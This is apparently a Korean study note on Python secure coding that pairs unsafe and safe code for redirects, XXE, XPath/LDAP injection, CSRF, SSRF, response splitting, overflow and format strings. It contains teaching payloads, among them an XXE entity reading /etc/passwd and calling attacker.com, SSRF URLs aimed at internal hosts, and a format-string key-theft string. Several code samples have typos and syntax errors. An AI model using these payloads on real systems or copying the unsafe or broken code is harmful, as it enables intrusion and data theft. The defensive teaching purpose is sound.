클라이언트에서 전송된 URL을 그대로 사용하면 안전하다고 오인할 수 있다.
그러나 **공격자**는 **정상적인 폼 요청을 변조**해 **사용자를 위험한 URL로 유도**할 수 있다.

**파이썬 프레임워크**에서 **redirect 함수**를 사용할 경우에도 **해당 프레임워크 버전에 알려진 취약점이 있는지** 확인해야 한다.

예를 들어 **Flask-Security-Too 라이브러리**의
**get_post_logout_redirect** 함수와 **get_post_login_redirect 함수**는 4.1.0 이전 버전에서 **URL 검증을 우회할 수 있는 취약점이 존재**한다.

안전한 코딩 기법으로는 **리다이렉션을 허용하는 모든 URL** 을 서버 측 **화이트리스트로 관리**해야 한다.
또한 **사용자 입력값이 실제로 허용된 URL인지 검증**해야 한다.

화이트리스트 관리가 어려운 경우에는 **프로토콜과 호스트 정보를 포함하지 않는 상대 경로(relative URL)만 허용**해야 한다.
**절대 URL**을 사용할 경우에는 **입력 URL**이 서비스 중인 **도메인으로 시작하는지 반드시 확인**해야 한다.

안전하지 않은 코드 예제

```
def redirect_url(request):
    url_string = request.POST.get('url', '')
    return redirect(url_string)

```

안전한 코드 예제

```
ALLOW_URL_LIST = [
'127.0.0.1',
'192.168.0.1',
'192.168.0.100',
'[https://login.myservice.com](https://login.myservice.com)',
'/notice',
]

def redirect_url(request):
    url_string = request.POST.get('url', '')

    if url_string not in ALLOW_URL_LIST:  
        return render(request, 'error.html', {'error': '허용되지 않은 주소입니다'})  

    return redirect(url_string)
```
---
6장, 7장 추가 필요

---
### 8. 부적절한 XML 외부 개체 참조

1_ XML 요청
2_ DTD에 정의된 파일 시스템 접근
3_ 정보 노출

**DTD**에 정의된 **외부 엔티티 요청**
**XML 문서**에는 **DTD(Document Type Definition)를 포함**할 수 있으며, **DTD**는 **XML 엔티티**를 정의한다. 
**부적절한 XML 외부 개체 참조 보안약점**은 서버에서 **XML 외부 엔티티를 처리**할 수 있도록 설정된 경우에 발생할 수 있다.
**취약한 XML 파서**가 **외부 값을 참조하는 XML을 처리**할 때, 공격자가 **삽입한 공격 구문**이 동작되어 **서버 파일 접근, 불필요한 자원 사용, 인증 우회, 정보 노출** 등이 발생할 수 있다.

파이썬에서는 간단한 **XML 데이터 구문 분석 및 조작**에 사용할 수 있는 **기본 XML 파서**가 제공된다. 이 파서는 **유효성 검사와 같은 고급 XML 기능은 지원하지 않는다.**
기본으로 제공되는 XML 파서는 외부 엔티티를 지원하지 않지만, 다른 유형의 XML 공격에는 취약할 수 있다.

기본으로 제공되는 파서의 기능 외에 더 많은 기능이 필요한 경우 **lxml과 같은 라이브러리**를 사용하게 되는데, 이 라이브러리에서는 **기본적으로 외부 엔티티의 구문 분석이 활성화**되어 있다.

안전한 코딩기법
안전한 코딩 기법으로는 **로컬 정적 DTD를 사용하도록 설정**하고, **외부에서** 전송된 XML 문서에 포함된 DTD를 **완전히 비활성화**해야 한다. 비활성화가 **불가능한 경우**에는 **외부 엔티티 및 외부 문서 유형 선언을 각 파서에 맞는 고유한 방식으로 비활성화**해야 한다.

외부 라이브러리를 사용할 경우, **기본적으로 외부 엔티티에 대한 구문 분석 기능을 제공하는지 확인**하고, 제공되는 경우 **해당 기능을 비활성화할 수 있는 방법을 확인**하여 **외부 엔티티 구문 분석 기능을 비활성화**해야 한다.
많이 사용하는 XML 파서 중 하나인 **lxml의 경우**, 외부 엔티티 구문 분석 옵션인 **resolve_entities 옵션을 비활성화**해야 한다. 또한 **외부 문서 조회 시 네트워크 접근을 방지하는 no_network 옵션이 활성화**되어 있는지도 확인해야 한다.

코드 예제는 **XML 소스를 읽어와 분석하는 코드**이다. 공격자는 아래와 같이 **XML 외부 엔티티를 참조하는 xxe.xml 데이터를 전송**하고, **이를 통해 /etc/passwd 파일을 참조**할 수 있다.

```
<?xml version="1.0" encoding="ISO-8859-1"?>

<!DOCTYPE foo [
<!ELEMENT foo ANY>

<!ENTITY xxe1 SYSTEM "file:///etc/passwd">

<!ENTITY xxe2 SYSTEM "http://attacker.com/text.txt">

]> <foo>&xxe1;&xxe2;</foo>
```

안전하지 않은 코드 예시
```
from xml.sax import make_parser
from xml.sax.handler import feature_external_ges
from xml.dom.pulldom import parseString, START_ELEMENT
from django.shortcuts import render
from model import components

def get_xml(request):
    data = comments.objects.all()
    corn = data[0].comment
    return render(request, '/xml_view.html', {'corn': corn})
    elif request.method == "POST":
        parser = make_parser()
        # 외부 일반 엔티티를 포함하는 설정을 true로 적용할 경우 취약하다
        parser.setFeature(feature_external_ges, True)

        doc = parseString(request.body.decode('utf-8'), parser=parser)

        for event, node in doc:
            if event == START_ELEMENT and node.tagName == "foo":
                doc.expandNode(node)
                text = node.toxml()
                comments.objects.filter(id=1).update(comment=text)

     return render(request, '/xml_view.html')
```

만약 **sax 패키지**를 사용해 XML을 파싱할 경우, **외부 엔티티를 처리하지 않도록 옵션(feature_external_ges = False)**으로 설정해야 한다.

```
from xml.sax import make_parser
from xml.sax.handler import feature_external_ges
from xml.dom.pulldom import parseString, START_ELEMENT
from django.shortcuts import render
from model import components

def get_xml(request):
    data = comments.objects.all()
    com = data[0].comment
    return render(request, '/xml_view.html', {'com': com})
    
    elif request.method == "POST":
        parser = make_parser()
        parser.setFeature(feature_external_ges, False)

        doc = parseString(request.body.decode('utf-8'), parser=parser)

    for event, node in doc:
        if event == START_ELEMENT and node.tagName == "foo":
            doc.expandNode(node)
            text = node.toxml()
            comments.objects.filter(id=1).update(comment=text)

        return render(request, '/xml_view.html')
```

---

### 9. XML 삽입

1_ **XPath 공격 패턴**
2_ **XPath 검증 구문 통과**
3_ 조작된 결과 획득(데이터 무단 조회, 인증 절차 우회)

검증되지 않은 **외부 입력값**이 **XQuery 또는 XPath를 생성하는 문자열로 사용될 경우**, 공격자가 **쿼리문의 구조를 임의로 변경**하여 **임의의 쿼리를 실행**하고 **허가되지 않은 데이터를 열람**하거나 **인증 절차를 우회**할 수 있는 보안 약점이다.

안전한 코딩기법
안전한 코딩 기법으로는 **XQuery 또는 XPath 쿼리에 사용되는 외부 입력 데이터**에 대해 **특수 문자 및 쿼리 예약어를 필터링**하고, **인자화된 쿼리문을 지원하는 XQuery를 사용**해야 한다.

코드 예제는 파이썬에서 **XML 데이터를 처리하기 위한 기본 모듈**인 **xml.etree.ElementTree**를 이용하여 **사용자 정보를 가져오는 예제**이다.
xml.etree.ElementTree 모듈은 **제한적인 XPath 기능을 제공**하며, **XPath 표현식을 인자화**하여 사용하는 방법은 제공하지 않는다.

안전하지 않은 코드 예시

```
from django.shortcuts import render
from lxml import etree

def parse_xml(request):
    user_name = request.POST.get('user_name', '')
    parser = etree.XMLParser(resolve_entities=False)

    tree = etree.parse('user.xml', parser)
    root = tree.getroot()

    # 검증되지 않은 외부 입력값 user_name을 사용한 안전하지 않은 질의문이 query 변수에 저장

    query = "/collection/user/user[@name='" + user_name + "']"

    # 검증되지 않은 외부 입력값 user_name 값을 질의문으로 사용

    elmts = root.xpath(query)

    return render(request, 'parse_xml.html', {'xml_element': elmts})
 ```

 파이썬 3.3 이후 보안상의 이유로 금지된 **xml.etree.ElementTree 모듈 대신 lxml 라이브러리를 사용**하고 외부 입력값은 인자화 해서 사용한다.

 ```
 from django.shortcuts import render
 from lxml import etree

 def parse_xml(request):
    user_name = request.POST.get('user_name', '')

    parser = etree.XMLParser(resolve_entites=False)
    tree = etree.parse('user.xml', parser)
    root = tree.getroot()

    # 외부 입력값을 paramname으로 인자화해서 사용

    query = '/collection/usesrs/user[@name = $paramname]/home/text()'
    elmts = root.xpath(query, paramname=user_name)
    return render(request, 'parse_xml.html', {'xml_element':elmts})
```

### 10. LDAP 삽입

[공격자]    1_ **LDAP 인젝션**                                [LDAP 서버]
                Normal Query + LDAP Injection Code
                (Query) + * ⇒ always true

[공격자] 2_ 결과 응답 및 추가 정보 노출                         [LDAP 서버]

외부 입력값을 적절한 처리 없이 **LDAP 쿼리문의 일부나 결과의 일부**로 사용하는 경우, 
LDAP 쿼리가 실행될 때 **공격자는 LDAP 쿼리문의 내용을 임의로 변경**할 수 있다.
이로 인해 **프로세스는 명령을 실행한 컴포넌트와 동일한 권한**을 가지고 동작하게 된다.
파이썬에는 **`python-ldap`와 `ldap3`**라는 두 개의 **LDAP 라이브러리**가 있다.

- **`ldap3`**는 `python-ldap`보다 **더 현대적인 라이브러리**이다.
`ldap3` 모듈은 Python 2.6부터 모든 Python 3 버전과 호환된다.
**`ldap3`**에는 Python다운 방식으로 **LDAP 서버와 상호작용**할 수 있도록 완전한 기능의 **추상화 계층**이 포함되어 있다.**`python-ldap`**는 **OpenLDAP**에서 만든 **Python 2 기반 패키지**이다.

Python3 환경에서는 **`ldap3` 라이브러리를 사용**하는 것이 권장된다.

---
안전한 코딩 기법

다른 삽입 공격과 마찬가지로 LDAP 삽입에 대한 기본적인 방어 방법은 **적절한 입력값 유효성 검사**이다.
**올바른 인코딩 함수를 사용**하여 **모든 변수를 이스케이프 처리**해야 한다.
**화이트리스트 방식의 입력값 유효성 검사**를 적용해야 한다. **사용자 패스워드**와 같은 **민감한 정보가 포함된 필드**는 **인덱싱을 주의**해야 한다.
**LDAP 바인딩 계정**에 **할당된 권한은 최소화**해야 한다. **사용자의 입력**을 그대로 **LDAP 질의문**에 사용하는 경우,**권한 상승** 등의 공격에 노출될 수 있다.

안전하지 않은 코드 예시

```python
from ldap3 import Connection, Server, ALL
from django.shortcuts import render

config = {
    "bind_dn": "cn=read-only-admin, dc=example, dc=com",
    "password": "password",
}

def ldap_query(request):
    search_keyword = request.POST.get('search_keyword', '')
    dn = config['bind_dn']
    password = config['password']
    address = 'ldap.badsource.com'

    server = Server(address, get_info=ALL)
    conn = Connection(server, user=dn, password=password, auto_bind=True)

    # 사용자 입력을 필터링하지 않을 경우 권한 상승 공격으로 이어질 수 있다.
    search_str = '(&(objectclass=%s))' % search_keyword

    conn.search(
        'dc=company,dc=com',
        search_str,
        attributes=['sn', 'cn', 'address', 'mail', 'mobile', 'uid']
    )

    return render(request, 'ldap_query_response.html', {'ldap': conn.entries})
```

사용자의 입력 중 **LDAP 질의문에 사용될 변수**를 **이스케이프 처리**하면, **질의문 실행** 시 **공격에 노출되는 것을 예방**할 수 있다.

안전한 코드 예시

```python
from ldap3 import Connection, Server, ALL
from ldap3.utils.conv import escape_filter_chars
from django.shortcuts import render

config = {
    "bind_dn": "cn=read-only-admin, dc=example, dc=com",
    "password": "password",
}

def ldap_query(request):
    search_keyword = request.POST.get('search_keyword', '')
    dn = config['bind_dn']
    password = config['password']
    address = 'ldap.badsource.com'

    server = Server(address, get_info=ALL)
    conn = Connection(server, user=dn, password=password, auto_bind=True)

    # 사용자 입력에 대해 필터링을 적용하여 공격에 사용될 수 있는 문자를 이스케이프 처리한다.
    escaped_keyword = escape_filter_chars(search_keyword)
    search_str = '(&(objectclass=%s))' % escaped_keyword

    conn.search(
        'dc=company,dc=com',
        search_str,
        attributes=['sn', 'cn', 'address', 'mail', 'mobile', 'uid']
    )

    return render(request, 'ldap_query_response.html', {'ldap': conn.entries})
```
아래는 **오타를 모두 수정**하고, **의미 단위로 한 문장씩 끊어서** 정리한 내용이야.
내용은 유지하고 표현만 정리했어.

---

### 11. CSRF (Cross-Site Request Forgery) 스크립트 공격

- 예시 `<img src="http://www.victim.com/board/notice/write/?name=관리자&email=admin@victim.com&title=긴급공지&contents=보안사고 발생..." width="0" height="0">`


1_ **CSRF 스크립트가 포함된 게시물이 등록**된다.
2_ **게시물 페이지 요청**이 발생한다.
3_ CSRF 스크립트가 포함된 **게시글 페이지가 응답**된다.
4_ **CSRF 스크립트가 실행**된다.
5_ **사용자의 권한으로 사용 가능한 서비스 요청이 수행**된다.

**CSRF 공격**은 특정 웹사이트에 대해 **사용자가 인지하지 못한 상황**에서, **사용자의 의도와 무관하게** 공격자가 **의도한 행위(수정, 삭제, 등록 등)를 요청하게 하는 공격**이다.
**웹 응용 프로그램**이 **사용자로부터 받은 요청**이 해당 사용자가 의도한 대로 작성되고 전송된 것인지 **확인하지 않는 경우 공격이 발생**할 수 있다. 
특히 사용자가 **관리자 권한을 가지는 경우**, **사용자 권한 관리, 게시물 삭제, 사용자 등록** 등 **관리자 권한**으로만 수행 가능한 기능을 공격자의 의도대로 실행시킬 수 있다.
공격자는 **사용자가 인증한 세션이 특정 동작을 수행한 이후에도 계속 유지**되어, **정상적인 요청과 비정상적인 요청을 구분하지 못하는 점**을 악용한다.

파이썬에서 가장 많이 사용되는 Django 프레임워크와 Flask 프레임워크는 각각 **CSRF(Cross-Site Request Forgery) 토큰 기능**을 지원한다.

Django는 **`{% csrf_token %}` 태그**를 이용하여 CSRF 토큰 기능을 제공한다.

Flask에서는 **Flask-WTF 확장 라이브러리**를 통해 **`{{ form.csrf_token }}` 태그를 사용**하여 **CSRF 토큰 기능**을 제공한다. 해당 태그를 사용하는 경우 **CSRF 공격에 대비**할 수 있다. 

안전한 코딩 기법

해당 요청이 **정상적인 사용자**의 **정상적인 절차**에 의한 요청인지 구분하기 위해, **세션별로 CSRF 토큰을 생성**하여 **세션에 저장**한다. 사용자가 **작업 페이지를 요청**할 때마다 **hidden 값**으로 토큰을 **클라이언트에 전달**한다.

이후 클라이언트의 **데이터 처리 요청 시 전달되는 CSRF 토큰 값을 확인**하여 **요청의 유효성을 검사**한다.

Django 프레임워크와 Flask 프레임워크는 **미들웨어 및 프레임워크 차원에서 기본적으로 CSRF 토큰을 사용**하여**CSRF 공격으로부터 보호하는 기능**을 제공한다.

해당 기능을 사용하기 위해서는 **form 태그 내부에 csrf_token을 반드시 포함**해야 한다.

Django 프레임워크는 1.2 버전부터 CSRF 취약점 방지 기능을 기본으로 제공한다. **미들웨어의 CSRF 옵션을 비활성화**하거나 템플릿에서 **`csrf_exempt` 데코레이터**를 사용하는 경우 **CSRF 공격에 노출**될 수 있다.

**Django 미들웨어 설정(settings.py)** 사례
```
MIDDLEWARE = [
'django.contrib.sessions.middleware.SessionMiddleware',
# MIDDLEWARE 목록에서 CSRF 항목을 삭제하거나 주석 처리하면
# CSRF 유효성 검사가 전역적으로 제거된다.
# 'django.middleware.csrf.CsrfViewMiddleware',
'django.contrib.auth.middleware.AuthenticationMiddleware',
'django.contrib.messages.middleware.MessageMiddleware',
'django.middleware.locale.LocaleMiddleware',
...
]
```
위 설정은 **Django의 CSRF 기능을 비활성화**하는 위험한 사례이다.

Django의 CSRF 기능을 활성화하려면 미들웨어 설정을 유지하고 템플릿 페이지의 form 태그 내부에 csrf_token을 명시해야 한다.

---

**Django 뷰 설정(views.py)** 사례

미들웨어에서 CSRF 검증 기능이 활성화되어 있어도, **View에서 CSRF 기능을 해제**하면 해당 요청에 대해서는 CSRF **검증이 수행되지 않는다.**
다음은 Function-Based View에서 CSRF 검증 기능을 비활성화하는 예시이다.

안전하지 않은 코드
```
from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt

@csrf_exempt
def pay_to_point(request):
    user_id = request.POST.get('user_id', '')
    pay = request.POST.get('pay', '')
    product_info = request.POST.get('product_info', '')
    ret = handle_pay(user_id, pay, product_info)
    return render(request, 'view_wallet.html', {'wallet': ret})
```

**csrf_exempt 데코레이터**는 **미들웨어에서 제공하는 CSRF 보호 기능을 해제**한다.

**Django**는 기본적으로 **CSRF 기능을 강제**한다. 부득이하게 CSRF 기능을 해제해야 하는 경우에도, **미들웨어의 CSRF 기능을 전역적으로 비활성화해서는 안 된다.** 
미들웨어의 CSRF 기능은 유지하고, 필요한 요청에 대해서만 csrf_exempt 데코레이터를 사용해야 한다.

이 경우에도 **크로스 사이트 요청 위조 공격에 노출**될 수 있으므로 각별한 주의가 필요하다.
  
**csrf_exempt 데코레이터를 삭제하거나 주석 처리**한 안전한 예시
```
from django.shortcuts import render

def pay_to_point(request):
    user_id = request.POST.get('user_id', '')
    pay = request.POST.get('pay', '')
    product_info = request.POST.get('product_info', '')
    ret = handle_pay(user_id, pay, product_info)
    return render(request, 'view_wallet.html', {'wallet': ret})
```

**Django 템플릿 설정** 사례

미들웨어에서 CSRF 기능을 활성화해도, 템플릿 페이지에 CSRF 토큰을 명시하지 않으면 CSRF 검증이 수행되지 않는다.

안전하지 않은 코드 예시
```
<!-- html page -->

<form action="" method="POST">
    <!-- form 태그 내부에 csrf_token 미적용 -->
    <table>
        {{ form.as_table }}
    </table>
    <input type="submit"/>
</form>
```
미들웨어에서 CSRF 기능을 활성화한 경우, 템플릿 페이지에서 csrf_token을 반드시 명시해야 한다.

안전한 코드 예시
```
<!-- html page -->

<form action="" method="POST">
    {% csrf_token %}
    <table>
        {{ form.as_table }}
    </table>
    <input type="submit"/>
</form>
```
- Flask CSRF 사례 추가하기
---

### 12. 서버사이드 요청 위조

1_ 조작한 요청을 전송한다.
2_ 조작한 요청을 처리한다.
3_ 조작된 요청을 대상 서버에 전달한다.
4_ 의도하지 않은 내부 리소스가 노출된다.

일반적인 상황에서는 신뢰된 내부 자원에 접근할 수 없다.
 

적절한 검증 절차를 거치지 않은 **사용자 입력값을 내부 서버 간 요청에 사용하는 경우**, 악의적인 행위가 발생할 수 있는 보안 약점이 된다. 
외부에 노출된 웹 서버가 취약한 애플리케이션을 포함하고 있는 경우, 공격자는 **URL 또는 요청문을 위조해 접근 통제**를 우회할 수 있다. 이 과정에서 **비정상적인 동작을 유도하거나, 신뢰된 네트워크 내부에 있는 데이터**를 획득할 수 있다.

안전한 코딩 기법

안전한 코딩 기법은 다음과 같다. 식별 가능한 범위 내에서 **사용자 입력값을 다른 시스템의 서비스 호출에 사용하는 경우**, **사용자 입력값을 화이트리스트 방식으로 필터링**해야 한다.
부득이하게 **사용자가 지정하는 무작위 URL을 받아들여야 하는 경우**에는 **내부 URL을 블랙리스트로 지정해 필터링**해야 한다.**(화이트리스트는 미리 정해둔 안전한 것만 통과시키는 목록이고, 블랙리스트는 위험하다고 알려진것만 골라서 막는 목록이다.)
** 또한 **동일한 내부 네트워크**에 있더라도 **기기 인증과 접근 권한을 확인한 뒤 요청**이 이루어지도록 해야 한다.

참고로 다음과 같은 **삽입 코드 예제**가 존재한다.
- **내부망 중요 정보 획득 예시**이다.
http://sample_site.com/connect?url=[http://192.168.0.45/member/list.json](http://192.168.0.45/member/list.json)

- **외부 접근이 차단된 admin 페이지 접근 예시**이다.
http://sample_site.com/connect?url=[http://192.168.0.45/admin](http://192.168.0.45/admin)

- **도메인 체크를 우회해 중요 정보를 획득하는 예시**이다.
http://sample_site.com/connect?url=http://sample_site.com:x@192.168.0.45/member/list.json

- **단축 URL을 이용해 필터링을 우회하는 예시**이다.
http://sample_site.com/connect?url=[http://bit.ly/sdjk3kjkl3](http://bit.ly/sdjk3kjkl3)

- **도메인을 사설 IP로 설정해 중요 정보를 획득하는 예시**이다.
http://sample_site.com/connect?url=[http://192.168.0.45/member/list.json](http://192.168.0.45/member/list.json)

- **서버 내 파일을 열람하는 예시**이다.
http://sample_site.com/connect?url=file:///etc/passwd

사용자로부터 **입력된 URL 주소를 검증 없이 사용**하면, **의도하지 않은 다른 서버의 자원에 접근**할 수 있다.


안전하지 않은 코드 
```python
import requests

def call_third_party_api(request):
    addr = request.POST.get('address', '')
    # 사용자가 입력한 주소를 검증하지 않고 HTTP 요청을 보낸 후 응답을 사용자에게 반환
    result = requests.get(addr).text
    return render(request, 'result.html', {'result': result})
```

안전한코드예시
**사전에 정의된 서버 목록을 사용**하면, 매칭되는 URL만 사용할 수 있어 URL 값을 임의로 조작할 수 없다. **도메인을 화이트리스트로 정의**한다. 
다만 화이트리스트 방식은 **DNS Rebinding 공격 등에 노출될 위험**이 있으므로, **신뢰할 수 있는 자원의 IP를 기준으로 검증하는 방식**이 더 안전하다.

```python
ALLOW_SERVER_LIST = [
    'https://127.0.0.1/latest',
    'https://192.168.0.1/user_data',
    'https://192.168.0.100/v1/public',
]

def call_third_party_api(request):
    addr = request.POST.get('address', '')
    # 사용자가 입력한 URL을 화이트리스트로 검증
    if addr not in ALLOW_SERVER_LIST:
        return render(request, 'error.html', {'error': '허용되지 않은 서버입니다.'})

    result = requests.get(addr).text
    return render(request, 'result.html', {'result': result})
```
---

### 13. HTTP 응답 분할 취약점 

**HTTP 요청에 인젝션 코드가 삽입**될 수 있다. **요청 파라미터가 응답 헤더에 포함**되면 문제가 발생한다. 이로 인해 **HTTP 응답이 분할**된다.
HTTP 요청 내 **파라미터가 HTTP 응답 헤더에 포함**되어 **사용자에게 다시 전달**될 때, **입력값에 CR(Carriage Return)이나 LF(Line Feed)와 같은 개행 문자가 존재**하면 **HTTP 응답이 두 개 이상으로 분리**될 수 있다.
이 경우 공격자는 **개행 문자를 이용해 첫 번째 응답을 종료**시키고, **두 번째 응답에 악성 코드를 주입해 XSS 공격이나 캐시 오염(Cache Poisoning) 공격**을 수행할 수 있다.
파이썬 3.9.5 이상 버전의 **URLValidator에서 HTTP 응답 분할 취약점이 보고**된 바 있으며, 해당 라이브러리를 사용하는 **Django 버전에도 영향을 미친다.**
HTTP 응답 분할 공격으로부터 애플리케이션을 안전하게 보호하려면 **최신 버전의 라이브러리와 프레임워크를 사용**해야 한다.또한 **외부 입력값에 대해서는 철저한 검증 작업**이 필요하다.

안전한 코딩 기법
**요청 파라미터 값을 HTTP 응답 헤더에 포함**시키는 경우 **CR(\r), LF(\n)와 같은 개행 문자를 제거**해야 한다. 
외부 입력값이 **헤더, 쿠키, 로그 등에 사용될 경우 항상 개행 문자를 검증**해야 한다. 가능하다면 **헤더에 사용되는 예약어를 화이트리스트로 제한**하는 것이 좋다.

안전하지 않은 코드 예시

```python
from django.http import HttpResponse

def route(request):
    content_type = request.POST.get('content-type')
    # 외부 입력값을 검증하지 않고 응답 헤더에 포함
    res = HttpResponse()
    res['Content-Type'] = content_type
    return res
```
안전한코드예시

**응답 분할을 예방하려면 \r, \n 같은 문자를 치환하거나 예외 처리**해야 한다.

```python
def route(request):
    content_type = request.POST.get('content-type')
    content_type = content_type.replace('\r', '')
    content_type = content_type.replace('\n', '')

    res = HttpResponse()
    res['Content-Type'] = content_type
    return res
```
 
---

### 14.정수형 오버플로우

**정수형 오버플로우**는 **정수형 크기가 고정된 상태**에서 **변수가 저장할 수 있는 범위를 넘어선 값을 저장**하려 할 때, **실제 저장되는 값이 의도치 않게 아주 작은 수 또는 음수가 되어 프로그램이 예기치 않게 동작하는 취약점**이다.
특히 **반복문 제어, 메모리 할당, 메모리 복사** 등의 조건에 **사용자 입력값이 사용**되고 그 과정에서 **오버플로우가 발생**하면 **보안상 문제가 유발**될 수 있다.

파이썬 2.x에서는 **int 타입 변수의 값이 표현 가능한 범위를 넘어서면 자동으로 long 타입으로 변경**해 범위를 확장한다.
파이썬 3.x에서는 **long 타입을 없애고 int 타입만 유지**하되, **정수 타입에 Arbitrary-precision arithmetic 방식을 사용해 오버플로우가 발생하지 않는다.**
하지만 파이썬 3.x에서도 **pydata stack을 사용하는 패키지**를 사용할 때는 **C언어와 동일하게 정수형 데이터가 처리**될 수 있으므로 **오버플로우 발생에 유의**해야 한다.
이처럼 언어 자체에서는 안전성을 보장하더라도, **특정 취약점에 취약한 패키지나 라이브러리를 사용하는 것에 주의**해야 한다.

안전한 코딩 기법
파이썬 자료형이 아니라 **패키지에서 제공하는 데이터 타입을 사용할 경우**, **해당 데이터 타입의 표현 방식과 최대 크기를 반드시 확인**해야 한다.
**NumPy는 기본적으로 64비트 길이의 정수형 변수를 사용**한다.
또한 **표현할 수 없는 큰 숫자를 문자열 형식(object)으로 변환하는 기능을 제공**한다.
하지만 64비트를 넘어서는 크기의 숫자는 제대로 처리하지 못할 수 있다.
따라서 **값 할당 전에 최소값과 최대값을 확인**하고, **범위를 넘어서는 값을 할당하지 않는지 테스트**해야 한다.

안전하지 않은 코드 예시

**거듭제곱을 계산해 그 결과를 반환하는 함수 예시**에서는, **계산 가능한 숫자에 대한 검증이 없어** 에러는 발생하지 않더라도 반환값을 처리하는 과정에서 예기치 않은 오류가 발생할 수 있다.


```python
import numpy as np

def handle_data(number, pow_value):
    res = np.power(number, pow_value, dtype=np.int64)
    # 64비트를 넘어서는 숫자와 지수가 입력되면 오버플로우가 발생해 결과가 0이 될 수 있다.
    return res
```
**오버플로우를 예방**하려면 **입력하는 값이 사용하는 데이터 타입의 최소값보다 작거나 최대값보다 큰지 확인**해야 한다.
계산이 필요한 경우에는 오버플로우가 발생하지 않는 **파이썬 기본 자료형으로 먼저 계산**하고, 그 결과를 검사해 **오버플로우 여부를 확인**해야 한다.

```python
import numpy as np

MAX_NUMBER = np.iinfo(np.int64).max
MIN_NUMBER = np.iinfo(np.int64).min

def handle_data(number, pow_value):
    calculated = number ** pow_value

    # 파이썬 기본 자료형으로 계산 후 범위 검사
    if calculated > MAX_NUMBER or calculated < MIN_NUMBER:
        return -1

    res = np.power(number, pow_value, dtype=np.int64)
    return res
```

---

### 15.보안 기능 결정에 사용되는 부적절한 입력값

**응용 프로그램**이 **외부 입력값에 대한 신뢰를 전제로 보호 메커니즘을 사용**하는 경우, **공격자가 입력값을 조작할 수 있다면 보호 메커니즘을 우회**할 수 있다.
개발자는 **흔히 쿠키, 환경변수, 히든필드 같은 입력값은 조작될 수 없다고 가정**한다. 하지만 **공격자는 다양한 방법으로 이러한 입력값을 변경할 수 있고, 조작된 내용은 탐지되지 않을 수 있다.**

**인증(Authentication)이나 인가(Authorization)** 같은 **보안 결정이 쿠키, 환경변수, 히든필드 등에 기반해 수행**된다면, 공격자는 **입력값을 조작해 응용 프로그램의 보안을 우회**할 수 있다.
따라서 **충분한 암호화와 무결성 체크를 수행**해야 하며, 이러한 메커니즘이 없다면 외부 사용자의 입력값을 신뢰해서는 안 된다.

파이썬 **Django 프레임워크**는 **세션(Session) 관리 기능을 제공**한다.
이 기능을 사용하면 **세션 쿠키의 만료 시점을 활용**할 수 있다.
또한 **DRF(Django Rest Framework)가 제공하는 토큰(Token)과 세션 기능을 함께 사용**해 더 안전하게 구성할 수 있다.

안전한 코딩 기법
**상태 정보나 민감한 데이터, 특히 사용자 세션 정보 같은 중요 정보**는 서버에 저장하고 **보안 확인이 가능한 서버에서 처리**해야 한다.
보안 설계 관점에서 **신뢰할 수 없는 입력값이 응용 프로그램 내부로 들어올 수 있는 지점을 검토**해야 한다.
그리고 **민감한 보안 기능 실행에 사용되는 입력값을 식별**해, **그 입력값에 대한 의존성을 없애는 구조로 변경 가능한지 분석**해야 한다.

쿠키에 저장된 권한 등급을 가져와 관리자인지 확인한 뒤 **사용자의 비밀번호를 초기화하고 메일을 보내는 예시**가 있다. 이 예시는 **쿠키에서 등급을 가져와 관리자 여부를 확인**한다.

안전하지 않은 코드 예시

```python
from django.shortcuts import render

def init_password(request):
    # 쿠키에서 권한 정보를 가져온다.
    role = request.COOKIES.get('role')
    request_id = request.POST.get('user_id', '')
    request_mail = request.POST.get('user_email', '')

    # 쿠키에서 가져온 권한이 관리자인지 확인
    if role == 'admin':
        password_init_and_sendmail(request_id, request_mail)
        return render(request, 'success.html')

    return render(request, 'failed.html')
```

**중요 기능 수행을 위한 데이터**는 **위변조 가능성이 높은 쿠키보다 세션에 저장**하도록 한다.

안전한 코드 예시는 다음과 같다.

```python
from django.shortcuts import render

def init_password(request):
    # 세션에서 권한 정보를 가져온다.
    role = request.session.get('role')
    request_id = request.POST.get('user_id', '')
    request_mail = request.POST.get('user_email', '')

    # 세션에서 가져온 권한이 관리자인지 확인
    if role == 'admin':
        password_init_and_sendmail(request_id, request_mail)
        return render(request, 'success.html')

    return render(request, 'failed.html')
```

---

### 16. 포맷 스트링 삽입

외부로부터 입력된 값을 검증하지 않고 **입출력 함수의 포맷 문자열로 그대로 사용하는 경우 발생할 수 있는 보안 약점**이다.
공격자는 **문자열을 이용해 취약한 프로세스를 공격**하거나 **메모리 내용을 읽고 쓸 수 있다.** 이를 통해 **취약한 프로세스의 권한을 취득**해 **임의의 코드를 실행**할 수 있다.

**파이썬은 문자열 포맷팅 방식으로 세 가지**를 제공한다.
첫째는 **퍼센트 포맷팅(% formatting)**이다.
둘째는 **str.format 방식**이다.
셋째는 **f-string 방식**이다. **f-string**은 파이썬 3.6 버전부터 사용 가능하다.
공격자는 **포맷 문자열을 이용해 내부 정보를 문자열로 만들 수 있으며**, 이를 그대로 사용하면 **중요 정보 유출로 이어질 수 있다.**

안전한 코딩 기법
포맷 문자열을 처리하는 함수를 사용할 때 **사용자 입력값을 직접 포맷 문자열로 사용하거나**, **포맷 문자열 생성에 포함시키지 않아야 한다**.
사용자로부터 **입력받은 데이터를 포맷 문자열로 사용해야 한다면**, **서식 지정자를 포함하지 않도록 해야 한다.**
또한 **파이썬 내장 함수 또는 내장 변수가 포함되지 않도록 해야 한다.**
코드 예제에서는 **외부에서 입력받은 문자열을 바로 포맷 문자열로 사용**하고 있다.
이 방식은 **내부 정보가 외부로 노출될 수 있는 문제를 내포**하고 있다.
**공격자가 `#{user.__init__.__globals__[AUTHENTICATE_KEY]}` 형태의 문자열을 입력하면 전역 변수에 접근해 AUTHENTICATE_KEY 값을 탈취**할 수 있다.

안전하지 않은 코드 예시
```python
from django.shortcuts import render

AUTHENTICATE_KEY = 'Passwd0rd'

def make_user_message(request):
    user_info = get_user_info(request.POST.get('user_id', ''))
    format_string = request.POST.get('msg_format', '')

    # 사용자가 입력한 문자열을 포맷 문자열로 사용하므로 내부 민감 정보가 노출될 수 있다.
    message = format_string.format(user=user_info)

    return render(request, 'user_page.html', {'message': message})
```

**외부에서 입력받은 문자열**은 반드시 **포맷 지정자를 이용해 바인딩한 뒤 사용**해야 하며, **직접 포맷 문자열로 사용해서는 안 된다.**

안전한 코드 예시

```python
from django.shortcuts import render

AUTHENTICATE_KEY = 'Passwd0rd'

def make_user_message(request):
    user_info = get_user_info(request.POST.get('user_id', ''))

